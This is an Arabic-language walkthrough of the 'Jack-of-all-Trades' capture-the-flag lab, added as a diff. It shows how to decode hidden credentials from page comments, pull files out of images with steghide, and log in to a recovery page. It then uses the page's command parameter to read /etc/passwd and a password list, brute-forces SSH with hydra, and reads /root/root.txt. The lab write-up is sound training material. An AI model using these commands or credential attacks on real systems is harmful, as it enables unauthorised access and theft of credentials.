@@ -1,0 +1,327 @@
+حل لاب Jack-of-all-Trades
+الاب سهل بس محتاج تركيز لذلك خليك معي 
+لو جاية شان تنسخ العلم انت بالمكان الخطء 
+===========================================
+اولا نفحص منافذ المختبر باستخدام 
+''nmap -Pn  -sV <ip_lab> ''
+نجد التالي :
+=========================================
+PORT   STATE SERVICE VERSION
+22/tcp open  http    Apache httpd 2.4.10 ((Debian))
+80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+========================================
+اولا النتائج غريبة صح ؟
+اي لان المنافذ الافتراضية معكوسة 
+هذا مش مهم فعليلا 
+========================================
+نجرب ندخل الويب سايت 
+<<ip_lab>>:22
+لا استجابة 
+اذا 
+''curl <<ip_lab:22>>''
+نجد بعض النتائج 
+========================================
+<html>
+        <head>
+                <title>Jack-of-all-trades!</title>
+                <link href="assets/style.css" rel=stylesheet type=text/css>
+        </head>
+        <body>
+                <img id="header" src="assets/header.jpg" width=100%>
+                <h1>Welcome to Jack-of-all-trades!</h1>
+                <main>
+                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
+                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
+                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
+                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
+                        <img src="assets/stego.jpg">
+                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
+                        <img src="assets/jackinthebox.jpg">
+                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
+                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
+                        <p>I hope you choose to employ me. I love making new friends!</p>
+                        <p>Hope to see you soon!</p>
+                        <p id="signature">Jack</p>
+                </main>
+        </body>
+</html>
+============================================
+لو انت شابف التعليقات فانت تمام لو مو شايفها
+تفضل 
+'' <!--Note to self - If I ever get locked out I can get back in at ! -->
+                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --> ''
+===========================================
+منه عندنا شغلتين مهمين 
+1.. /recovery.php
+2.. base64 بالتعليق التاني 
+ببساطة بصمة الترميز 
+اولها umv 
+اخرها == 
+طيب هلق شو منعمل 
+''echo "نص base64" || base64 --decode ''
+الان نجد :
+===========================================
+"Remember to wish Johnny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: ""
+===========================================
+اوك ممتاز 
+صار عنا 
+''password=u?WtKSraq''
+===========================================
+جرب على shh 
+مارح تنفع بعرف مارح تكون سهلة هيك 
+===========================================
+نروح نجرب المسار يلي عطاك ياه 
+''curl ip_lab:22/recovery.php''
+نجد :
+===========================================
+!DOCTYPE html>
+<html>
+        <head>
+                <title>Recovery Page</title>
+                <style>
+                        body{
+                                text-align: center;
+                        }
+                </style>
+        </head>
+        <body>
+                <h1>Hello Jack! Did you forget your machine password again?..</h1>
+                <form action="/recovery.php" method="POST">
+                        <label>Username:</label><br>
+                        <input name="user" type="text"><br>
+                        <label>Password:</label><br>
+                        <input name="pass" type="password"><br>
+                        <input type="submit" value="Submit">
+                </form>
+                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
+                 
+        </body>
+</html>
+======================================
+طيب شو لقينا 
+1. تعليق تاني 
+"شكرا جاك حياتي عم تصير اسهل "
+طيب عندك تعليق 
+base32 
+لو ما بتعرف الترميز ممكن تسائل ai 
+نفكه 
+''echo "التعليق " | base32 --decode '' 
+نجد :
+======================================
+45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246base32
+======================================
+اوك صار هيكس 
+''echo "الناتج "| xxd -r -p 
+نجد 
+======================================
+Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2
+=====================================
+هذا ترميز قيصر "rot13"
+على "rot13.com"
+بتزت له الناتج ف بتلاقي 
+====================================
+Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
+====================================
+طيب اخذك على ويكبديا 
+حل كثير انت لو قارء اول رسبون بتعرف ان جاك بيحب الدبنصورات 
+اصلي بلشنا نلقط خيط جديد 
+نرجع للرسبون الاول ونعيد تحليله 
+بلاقي هي الجملة :
+"I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
+                        <img src="">
+                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
+                        <img src="assets/jackinthebox.jpg">
+"
+طيب بجيب اول صورة عن طريق 
+'' wget ip_lab:22/assets/stego.jpg ''
+بعمل لها 
+''steghide info stego.jpg''
+حلو طلب كلمة مرور نجرب يلي "u?WtKSraq"
+اداني ملف creds.txt 
+لو فتحته بيقول لك صح بس غير مكان 
+نجرب المسار الثاني مافي نتائج 
+نرجع للرسبون ونشوف مسار كمان 
+رح تلاقي 
+"assets/header.jpg"
+الصورة الوحيدة يلي ماشفناها 
+ننزلها 
+''wget ip_lab:22/assets/header.jpg''
+ممتاز
+نستخرج الملف يلي جوى الصورة عن طريق 
+''steghide extract -sf  header.jpg''
+رح نجد انه اعطاني ملف 
+"cms.creds"
+لو فتحته عن طريق cat 
+لح نلاقي 
+=====================================
+
+Username: jackinthebox
+Password: TplFxiSHjY
+=====================================
+اوك طيب هون نحنا لقينااسم المستخدم وكلمة المرور 
+نعمل 
+''curl -i -X POST  ip_lab:22/recovery.php  -d"user=jackinthebox&pass=TplFxiSHjY" ''
+نستنا الرسبون شوي 
+رح نلاقي 
+=====================================
+HTTP/1.1 302 Found
+Date: Thu, 12 Feb 2026 16:30:09 GMT
+Server: Apache/2.4.10 (Debian)
+Set-Cookie: PHPSESSID=m5ck3nifnej63mdj29e9ng1jl6; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84; expires=Sat, 14-Feb-2026 16:30:09 GMT; Max-Age=172800
+location: /nnxhweOV/index.php
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+========================================
+ممتاز جدا 
+نعمل 
+''nano cookie.txt '' 
+ونحط الكوكيز بتاعتنا 
+sSet-Cookie: PHPSESSID=m5ck3nifnej63mdj29e9ng1jl6; path=/
+Set-Cookie: login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84; expires=Sat, 14-Feb-2026 16:30:09 GMT; Max-Age=172800
+
+طيب نجرب نوصل بالموقع باستخدام الملف 
+'curl -i -b cookies.txt  ip_lab:22/nnxhweOV/index.php'
+  
+رح نلاقي هون 
+GET me a 'cmd' and I'll run it for you Future-Jack.
+
+اوك طيب رح جرب 
+' curl -i -b cookies.txt  "ip_lab:22/nnxhweOV/index.php?cmd=pwd"'
+/var/www/html/nnxhweOV
+/var/www/html/nnxhweOV  
+===========================================
+في حل انك تعمل رفيس شل 
+بس انا ماعملته وفيك تعمل متلي 
+'curl -i -b cookies.txt  "10.64.139.13:22/nnxhweOV/index.php?cmd=cat%20/etc/passwd"'
+لح نلقى 
+HTTP/1.1 200 OK
+Date: Thu, 12 Feb 2026 16:39:45 GMT
+Server: Apache/2.4.10 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1651
+Content-Type: text/html; charset=UTF-8
+
+GET me a 'cmd' and I'll run it for you Future-Jack.
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+uuidd:x:104:109::/run/uuidd:/bin/false
+Debian-exim:x:105:110::/var/spool/exim4:/bin/false
+messagebus:x:106:111::/var/run/dbus:/bin/false
+statd:x:107:65534::/var/lib/nfs:/bin/false
+avahi-autoipd:x:108:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
+jack:x:1000:1000:jack,,,:/home/jack:/bin/bash    
+==========================================================================
+اوك عندنا يوزر اسمه 
+jake 
+طيب بالمرة تعال نشوف الهوم 
+'curl -i -b cookies.txt  "ip_lab:22/nnxhweOV/index.php?cmd=ls%20/home"'
+الرد 
+jack
+jacks_password_list
+jacks_password_list                                                                                             
+
+اوك اوك نعمل 
+'curl -i -b cookies.txt  "10.64.139.13:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list"
+'
+الرد 
+HTTP/1.1 200 OK
+Date: Thu, 12 Feb 2026 17:08:34 GMT
+Server: Apache/2.4.10 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 476
+Content-Type: text/html; charset=UTF-8
+
+GET me a 'cmd' and I'll run it for you Future-Jack.
+*hclqAzj+2GC+=0K
+eN<A@n^zI?FE$I5,
+X<(@zo2XrEN)#MGC
+,,aE1K,nW3Os,afb
+ITMJpGGIqg1jn?>@
+0HguX{,fgXPE;8yF
+sjRUb4*@pz<*ZITu
+[8V7o^gl(Gjt5[WB
+yTq0jI$d}Ka<T}PD
+Sc.[[2pL<>e)vC4}
+9;}#q*,A4wd{<X.T
+M41nrFt#PcV=(3%p
+GZx.t)H$&awU;SO<
+.MVettz]a;&Z;cAC
+2fh%i9Pr5YiYIf51
+TDF@mdEd3ZQ(]hBO
+v]XBmwAk8vk5t3EF
+9iYZeZGQGG9&W4d1
+8TIFce;KjrBWTAY^
+SeUAwt7EB#fY&+yt
+n.FZvJ.x9sYe5s5d
+8lN{)g32PG,1?[pM
+z@e1PmlmQ%k5sDz@
+ow5APF>6r,y4krSo
+ow5APF>6r,y4krSo                
+==================================
+المهم نعمل list 
+نروح نخمن الباسورد تبع jack 
+''hydra -l jack -P pass.txt -s 80  ssh://ip_lab -t 4 -V''
+==================================
+بعد ضهور الباسورد ندخل ssh
+'ssh -p80 jack@10.64.139.13'
+الان نعمل 
+'ls -lah'
+عندنا صورة 
+"جاك التامين عنده عبارة عن صور  :)"
+ننسخ الصورة 
+'scp -P 80 jack@10.64.139.13:/home/jack/user.jpg ./'
+نفتحها رح نلاقي العلم 
+securi-tay2020_{p3ngu1n-hunt3r-* * * * *1r3}
+
+طيب حان وقت العلم تبع الروت 
+نجرب 
+'sudo su '
+جاك مقيد 
+حلو نجرب 
+'find / -perm -4000 -type f 2>/dev/null'
+عم ندور على ملف بصلاحبات خاصة "اي ملف مفعل"
+عندنا 
+"/usr/bin/"
+طيب كويس 
+تعا نشوف الملف يلي عند الروت بس صلاحياته مضبوطة غلط 
+'find / -user root -readable -type f 2>/dev/null'
+اوك الغالي طلع 
+'/root/root.txt'
+نعمل 
+'strings /root/root.txt'
+والعلم الثاني ضهر 
+
+securi-tay2020_{6f125d32f38fb8ff9****d2dbce2210a}
